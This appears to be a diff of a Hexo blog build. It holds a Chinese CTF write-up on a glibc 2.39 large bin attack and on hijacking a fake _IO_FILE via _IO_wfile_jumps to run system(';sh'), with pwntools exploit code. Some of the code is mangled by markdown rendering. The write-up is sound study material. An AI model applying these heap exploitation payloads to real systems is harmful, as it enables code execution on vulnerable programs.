@@ -1,94 +1,27 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  
-  
-  <title>Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="堆上的IO，largbin高版本的利用​浅析Large_bins_attack在高低版本的利用large bin attack - DAMOXILAI - 博客园   ● exit()的IO调用链  └─ __run_exit_handlers      └─ 遍历 atexit 回调链表          └─ _IO_cleanup()                       [libc初">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/2026/07/21/%E5%A0%86%E4%B8%8A%E7%9A%84IO%EF%BC%8Clargbin%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84%E5%88%A9%E7%94%A8/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="堆上的IO，largbin高版本的利用​浅析Large_bins_attack在高低版本的利用large bin attack - DAMOXILAI - 博客园   ● exit()的IO调用链  └─ __run_exit_handlers      └─ 遍历 atexit 回调链表          └─ _IO_cleanup()                       [libc初">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/assets/image-20260524195338-loa2jsp.png">
-<meta property="og:image" content="http://example.com/assets/image-20260529213735-i0bjl95.png">
-<meta property="article:published_time" content="2026-07-21T13:28:27.614Z">
-<meta property="article:modified_time" content="2026-07-21T13:28:10.000Z">
-<meta property="article:author" content="John Doe">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/assets/image-20260524195338-loa2jsp.png">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
-  
-<link rel="stylesheet" href="/css/style.css">
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Hello World</title>
+    <url>/2026/07/21/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
 
-  
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
 
-  
-  
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
 
-<meta name="generator" content="Hexo 7.3.0"></head>
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
 
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-        
-          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
-        
-        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
-
-      <div class="outer">
-        <section id="main"><article id="post-堆上的IO，largbin高版本的利用" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2026/07/21/%E5%A0%86%E4%B8%8A%E7%9A%84IO%EF%BC%8Clargbin%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84%E5%88%A9%E7%94%A8/" class="article-date">
-  <time class="dt-published" datetime="2026-07-21T13:28:27.614Z" itemprop="datePublished">2026-07-21</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="堆上的IO，largbin高版本的利用"><a href="#堆上的IO，largbin高版本的利用" class="headerlink" title="堆上的IO，largbin高版本的利用"></a>堆上的IO，largbin高版本的利用</h1><p><img src="/assets/image-20260524195338-loa2jsp.png" alt="image">​<br><a href="read://https_xz.aliyun.com/?url=https%3A%2F%2Fxz.aliyun.com%2Fnews%2F15081">浅析Large_bins_attack在高低版本的利用</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/damoxilai/p/16380750.html">large bin attack - DAMOXILAI - 博客园</a>  </p>
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2026/07/21/%E5%A0%86%E4%B8%8A%E7%9A%84IO%EF%BC%8Clargbin%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[<h1 id="堆上的IO，largbin高版本的利用"><a href="#堆上的IO，largbin高版本的利用" class="headerlink" title="堆上的IO，largbin高版本的利用"></a>堆上的IO，largbin高版本的利用</h1><p><img src="/assets/image-20260524195338-loa2jsp.png" alt="image">​<br><a href="read://https_xz.aliyun.com/?url=https%3A%2F%2Fxz.aliyun.com%2Fnews%2F15081">浅析Large_bins_attack在高低版本的利用</a><br><a href="https://www.cnblogs.com/damoxilai/p/16380750.html">large bin attack - DAMOXILAI - 博客园</a>  </p>
 <p>● exit()的IO调用链<br>  └─ __run_exit_handlers<br>      └─ 遍历 atexit 回调链表<br>          └─ _IO_cleanup()                       [libc初始化时注册的ef_cxa回调]<br>              └─ _IO_flush_all_lockp(1)</p>
 <pre><code>              for (fp = _IO_list_all; fp != NULL; fp = fp-&gt;_chain)  
               │  
@@ -122,7 +55,7 @@
                                   │  
                                   └─ system(&quot;;sh&quot;) → /bin/sh  
 </code></pre>
-<p>ida:<img src="/assets/image-20260529213735-i0bjl95.png" alt="image"><br>简单阐述一下功能  create：创建函数，但是堆申请大小要至少大于0x408<br>                delete：删除函数，但是存在uaf<br>                show：输出堆块数据区<br>                edit：根据申请堆块大小来写数据区内容<br>                exit：正常free掉后执行exit（0）退出（漏洞所在）<br>大致思路：<br>    泄露libc基址，直接利用unsortedbin来泄露即可，delete对应堆块然后删掉show即可，再减掉偏移即可<br>    然后进入正式的利用：利用large_bin来构造伪造_IO_file_结构<br>    对应资料参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/15081">浅析Large_bins_attack在高低版本的利用-先知社区</a><br>    这里的libc版本是2.39<br>    assert (chunk_main_arena (bck-&gt;bk));&#x2F;&#x2F;断言bck-&gt;bk属于main_arena<br>if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))<br>{<br>       fwd &#x3D; bck; &#x2F;&#x2F;这里的fwd可以粗略的认为是large_bin归属的main_arena<br>       bck &#x3D; bck-&gt;bk; &#x2F;&#x2F;bck成了main_arena的bk指针指向的堆块<br>       victim-&gt;fd_nextsize &#x3D; fwd-&gt;fd; &#x2F;&#x2F;我们申请的小堆块的fd_nextsize指向了main_arena的fd指针，也就是所在的large_bin的最大的堆块<br>       victim-&gt;bk_nextsize &#x3D; fwd-&gt;fd-&gt;bk_nextsize;&#x2F;&#x2F;攻击点，没有检测，所以我们可以伪造大堆块的bk_nextsize<br>       fwd-&gt;fd-&gt;bk_nextsize &#x3D; victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim; &#x2F;&#x2F;先进行右值运算，如果在没有进行修改的情况下，等式可以化简为fwd-&gt;fd-&gt;bk_nextsize &#x3D; victim，也就是最大堆块的bk_nextsize指向我们的最小堆块victim<br>}<br>也就是，这里如果整理进去的large_bin比large_bin里面最小的还要小，那么就会执行这个，也就是victim，新整理进去的，会调整它的fd_nextsize和bk_nextsize，之后就是最后一步，也就是最重要的会根据已经改的victim_的bk_nextsize的把对应堆块的fd_nextsize改成victim,这里就是主要漏洞点，那么这里控制到了victim堆块的fd_nextsize，也就相当于可以控制指针了，也就是其bk_nextsize所指向的内容的0x10处的指针指向了victim堆块，之后呢伪造victim堆块的结构体即可</p>
+<p>ida:<img src="/assets/image-20260529213735-i0bjl95.png" alt="image"><br>简单阐述一下功能  create：创建函数，但是堆申请大小要至少大于0x408<br>                delete：删除函数，但是存在uaf<br>                show：输出堆块数据区<br>                edit：根据申请堆块大小来写数据区内容<br>                exit：正常free掉后执行exit（0）退出（漏洞所在）<br>大致思路：<br>    泄露libc基址，直接利用unsortedbin来泄露即可，delete对应堆块然后删掉show即可，再减掉偏移即可<br>    然后进入正式的利用：利用large_bin来构造伪造_IO_file_结构<br>    对应资料参考：<a href="https://xz.aliyun.com/news/15081">浅析Large_bins_attack在高低版本的利用-先知社区</a><br>    这里的libc版本是2.39<br>    assert (chunk_main_arena (bck-&gt;bk));&#x2F;&#x2F;断言bck-&gt;bk属于main_arena<br>if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))<br>{<br>       fwd &#x3D; bck; &#x2F;&#x2F;这里的fwd可以粗略的认为是large_bin归属的main_arena<br>       bck &#x3D; bck-&gt;bk; &#x2F;&#x2F;bck成了main_arena的bk指针指向的堆块<br>       victim-&gt;fd_nextsize &#x3D; fwd-&gt;fd; &#x2F;&#x2F;我们申请的小堆块的fd_nextsize指向了main_arena的fd指针，也就是所在的large_bin的最大的堆块<br>       victim-&gt;bk_nextsize &#x3D; fwd-&gt;fd-&gt;bk_nextsize;&#x2F;&#x2F;攻击点，没有检测，所以我们可以伪造大堆块的bk_nextsize<br>       fwd-&gt;fd-&gt;bk_nextsize &#x3D; victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim; &#x2F;&#x2F;先进行右值运算，如果在没有进行修改的情况下，等式可以化简为fwd-&gt;fd-&gt;bk_nextsize &#x3D; victim，也就是最大堆块的bk_nextsize指向我们的最小堆块victim<br>}<br>也就是，这里如果整理进去的large_bin比large_bin里面最小的还要小，那么就会执行这个，也就是victim，新整理进去的，会调整它的fd_nextsize和bk_nextsize，之后就是最后一步，也就是最重要的会根据已经改的victim_的bk_nextsize的把对应堆块的fd_nextsize改成victim,这里就是主要漏洞点，那么这里控制到了victim堆块的fd_nextsize，也就相当于可以控制指针了，也就是其bk_nextsize所指向的内容的0x10处的指针指向了victim堆块，之后呢伪造victim堆块的结构体即可</p>
 <p>第一步先改堆块：<br>    add(2,0x508)<br>    add(0,0x520)<br>    add(5,0x508)<br>    add(1,0x500)<br>    delete(0)<br>    show(0)<br>    p.recvuntil(b’content : ‘)<br>    addr&#x3D;u64(p.recv(6).ljust(8,b’\x00’))<br>    print(hex(addr))<br>    #gdb.attach(p)<br>    base&#x3D;addr-0x203b20<br>    IO_list&#x3D;base+libc.sym[‘_IO_list_all’]<br>    print(hex(base))<br>    system&#x3D;base+libc.sym[‘system’]<br>    IO_wfile_jumps&#x3D;base+libc.sym[‘_IO_wfile_jumps’]<br>    head&#x3D;addr+0x430<br>    #gdb.attach(p)<br>    payload&#x3D;b’a’<em>0x10<br>add(3,0x530)<br>edit(0,payload)<br>show(0)<br>p.recvuntil(b’content : aaaaaaaaaaaaaaaa’)<br>heap&#x3D;u64(p.recv(6).ljust(8,b’\x00’))<br>print(hex(heap))<br>#gdb.attach(p)<br>payload&#x3D;p64(head)</em>* 2+p64(heap)+p64(IO_list-0x20)<br>edit(0,payload)<br>delete(1)<br>add(4,0x540)<br>#gdb.attach(p)<br>edit(5, b’a’ * 0x500 + p32(0xfffff7f5) + b’;sh\x00’)<br>chunk&#x3D;heap+0xa40<br>#gdb.attach(p)<br>    这里很明显是选用的堆块0和堆块1来使能够构造出能够伪造IO_file的结构体堆块，这里的结构体堆块明显就是1了，由于1的bk_nextsize会被改成0的bk_nextsize,<br>所以这里直接先利用uaf来伪造好其内容即可，之后再次之前还需要去拿到堆块的地址，才行，不然后面没法去还原堆块的head，其实也就是main_arena，尝试了下，可以<br>其实也可以换上对应libc来计算偏移，因为largbin在只有一个堆块的时候，它的bk_nextsize和fd_nextsize是指向自己的头，所以这里泄露出来的heap其实就是堆块0的头地址，这里加上加上0xa40正好是堆块1的头地址，并且heap本身也就是堆块0来伪造时还原原部分的东西<br>    这里堆块1的头地址，也是也是方便后面伪造的时候调转的地址<br>伪造的_IO_file结构：<br>edit(5, b’a’ * 0x500 + p32(0xfffff7f5) + b’;sh\x00’)<br>chunk&#x3D;heap+0xa40<br>#gdb.attach(p)&#x2F;&#x2F;注意size段也占了一个<br>fake_IO &#x3D; p64(0) * 2 + p64(1) + p64(2)<br>fake_IO &#x3D; fake_IO.ljust(0xa0 - 0x10,b’\x00’) + p64(chunk + 0x100) #wide_data<br>fake_IO &#x3D; fake_IO.ljust(0xc0 - 0x10,b’\x00’) + p64(0xffffffffffffffff) #mode<br>fake_IO &#x3D; fake_IO.ljust(0xd8 - 0x10,b’\x00’) + p64(IO_wfile_jumps) #vtable<br>fake_IO &#x3D; fake_IO.ljust(0x100 - 0x10 + 0xe0,b’\x00’) + p64(chunk + 0x200) #_wide_data-&gt;_wide_vtable<br>fake_IO &#x3D; fake_IO.ljust(0x200 - 0x10,b’\x00’) + p64(0) * 13 + p64(system) # _wide_data-&gt;_wide_vtable-&gt;doallocate<br>edit(1,fake_IO)</p>
 <p>梳理劫持流程：<br>    0x00        _flags                chunk header[0x00] &#x3D; prev_size<br>    0x08        _IO_read_ptr          chunk header[0x08] &#x3D; size<br>    0x10        _IO_read_end          fake_IO[0x00] &#x3D; p64(0)<br>    0x18        _IO_read_base         fake_IO[0x08] &#x3D; p64(0)<br>    0x20        _IO_write_base        fake_IO[0x10] &#x3D; p64(1)  ←!<br>    0x28        _IO_write_ptr         fake_IO[0x18] &#x3D; p64(2)  ←!<br>    0x30        _IO_write_end         fake_IO[0x20] &#x3D; 0 (ljust填充)<br>    0x38        _IO_buf_base          0 (ljust)<br>    0x40        _IO_buf_end           0<br>    …<br>    0x68        _chain                0 (ljust)<br>    …<br>    0x88        _lock                 0 (ljust)<br>    …<br>    0xa0        _wide_data            fake_IO[0x90] &#x3D; chunk+0x100<br>    …<br>    0xc0        _mode                 fake_IO[0xb0] &#x3D; 0xFFFFFFFFFFFFFFFF<br>    0xc4~0xd7   padding              0<br>    0xd8        vtable                fake_IO[0xc8] &#x3D; _IO_wfile_jumps<br>先展示调用链就是最开头的那个，第一个过条件时_IO_flush_all_lockp(),这里注意下伪造的_IO_file_结构里面的锁处要为0，否则无法进行，<br>然后就i是进入IO_overflow的条件_mode &lt;&#x3D; 0 &amp;&amp; _IO_write_ptr &gt; _IO_write_base，还有另外一个分支，这里用的时这个<br>可以看到这里的write_ptr确实时大于base的mode的伪造也是小于0的负数，所以这里就绕过进入了_IO_overflow<br>    进入IO_overflow以后就是：  </p>
 <p>_IO_wfile_overflow(FILE *f, wint_t wch)<br>{<br>    &#x2F;&#x2F; —- 检查1: _IO_NO_WRITES 标志 —-<br>    if (f-&gt;_flags &amp; _IO_NO_WRITES)  &#x2F;&#x2F; _IO_NO_WRITES &#x3D; 0x0008<br>    {<br>        f-&gt;_flags |&#x3D; _IO_ERR_SEEN;<br>        __set_errno(EBADF);<br>        return WEOF;                &#x2F;&#x2F; ← 如果flags有0x8就死在这<br>    }<br>    &#x2F;&#x2F; 我们的 flags &#x3D; 0, 不触发 ?</p>
@@ -144,114 +77,6 @@ if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0)  // 0x0800
 </code></pre>
 <p>}<br>这里的话只要flag的头里面没有0x8即可过检查，这里需要注意wide_data所指向的_IO_write_base和我们伪造的write_base不一定时一样的，因为这个是时根据wide_data的指针内容和对应的偏移来跳转的<br>wide_data的具体结构：<br>struct _IO_wide_data           &#x2F;&#x2F; 宽字符数据结构体<br>{<br>    wchar_t *_IO_read_ptr;     &#x2F;&#x2F; 0x00<br>    wchar_t *_IO_read_end;     &#x2F;&#x2F; 0x08<br>    wchar_t *_IO_read_base;    &#x2F;&#x2F; 0x10<br>    wchar_t *_IO_write_base;   &#x2F;&#x2F; 0x18: ← _IO_wfile_overflow检查这里是否为0<br>    wchar_t *_IO_write_ptr;    &#x2F;&#x2F; 0x20<br>    wchar_t *_IO_write_end;    &#x2F;&#x2F; 0x28<br>    wchar_t *_IO_buf_base;     &#x2F;&#x2F; 0x30<br>    wchar_t *_IO_buf_end;      &#x2F;&#x2F; 0x38<br>    wchar_t *_IO_save_base;    &#x2F;&#x2F; 0x40<br>    wchar_t *_IO_backup_base;  &#x2F;&#x2F; 0x48<br>    wchar_t *_IO_save_end;     &#x2F;&#x2F; 0x50<br>    __mbstate_t _IO_state;     &#x2F;&#x2F; 0x58<br>    __mbstate_t _IO_last_state;&#x2F;&#x2F; 0x60<br>    struct _IO_codecvt _codecvt;&#x2F;&#x2F; 0x68<br>    wchar_t _shortbuf[1];      &#x2F;&#x2F; 0xc8<br>    &#x2F;&#x2F; …<br>    const struct _IO_jump_t *_wide_vtable; &#x2F;&#x2F; 0xe0: ← 假跳板目标!<br>    &#x2F;&#x2F;                                        __doallocate替换为system<br>};<br>这里的话也就是wide指针的0x18的地方为0即可，之后就进入到了 _IO_wdoallocbuf(f)<br>    进去之后呢，就是调用了fp-&gt;_wide_data-&gt;_wide_vtable-&gt;__doallocate<br>    这里可以看到wide_vtable对于wide_data的 偏移是0xe0，doallcate在vtable偏移0x68处，这个位置放上system即可<br>_wide_vtable:<br>const struct _IO_jump_t _IO_wfile_jumps <strong>attribute</strong>((section(“__libc_IO_vtables”))) &#x3D;<br>{<br>    0,                       &#x2F;&#x2F; 0x00 __dummy<br>    0,                       &#x2F;&#x2F; 0x08 __dummy2<br>    _IO_file_finish,         &#x2F;&#x2F; 0x10 __finish<br>    _IO_wfile_overflow,      &#x2F;&#x2F; 0x18 __overflow    ← _IO_OVERFLOW调这里<br>    _IO_wfile_underflow,     &#x2F;&#x2F; 0x20 __underflow<br>    _IO_wfile_underflow,     &#x2F;&#x2F; 0x28 __uflow<br>    _IO_wdefault_pbackfail,  &#x2F;&#x2F; 0x30 __pbackfail<br>    _IO_wdefault_xsputn,     &#x2F;&#x2F; 0x38 __xsputn<br>    _IO_wdefault_xsgetn,     &#x2F;&#x2F; 0x40 __xsgetn<br>    _IO_wfile_seekoff,       &#x2F;&#x2F; 0x48 __seekoff<br>    _IO_default_seekpos,     &#x2F;&#x2F; 0x50 __seekpos<br>    _IO_default_setbuf,      &#x2F;&#x2F; 0x58 __setbuf<br>    _IO_wfile_sync,          &#x2F;&#x2F; 0x60 __sync<br>    _IO_wfile_doallocate,    &#x2F;&#x2F; 0x68 __doallocate  ← 正常路径<br>    _IO_file_read,           &#x2F;&#x2F; 0x70 __read<br>    _IO_file_write,          &#x2F;&#x2F; 0x78 __write<br>    _IO_file_seek,           &#x2F;&#x2F; 0x80 __seek<br>    _IO_file_close,          &#x2F;&#x2F; 0x88 __close<br>    _IO_file_stat,           &#x2F;&#x2F; 0x90 __stat<br>    _IO_wfile_showmanyc,     &#x2F;&#x2F; 0x98 __showmanyc<br>    _IO_wfile_imbue,         &#x2F;&#x2F; 0xa0 __imbue<br>};<br>这里可以看到doallcate在wide_vtable里面的偏移是0x68，就是执行对应位置的system了，system（sh）</p>
 <p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2026/07/21/%E5%A0%86%E4%B8%8A%E7%9A%84IO%EF%BC%8Clargbin%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84%E5%88%A9%E7%94%A8/" data-id="cmrupa0y90001ikby87x745o8" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-    
-<nav id="article-nav">
-  
-  
-    <a href="/2026/07/21/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">Hello World</div>
-    </a>
-  
-</nav>
-
-  
-</article>
-
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-
-  
-    
-
-  
-    
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/07/">July 2026</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2026/07/21/%E5%A0%86%E4%B8%8A%E7%9A%84IO%EF%BC%8Clargbin%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84%E5%88%A9%E7%94%A8/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2026/07/21/hello-world/">Hello World</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2026 John Doe<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
-
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
-
-
-<script src="/js/jquery-3.6.4.min.js"></script>
-
-
-
-  
-<script src="/fancybox/jquery.fancybox.min.js"></script>
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-
-
-
-  </div>
-</body>
-</html>
+]]></content>
+  </entry>
+</search>
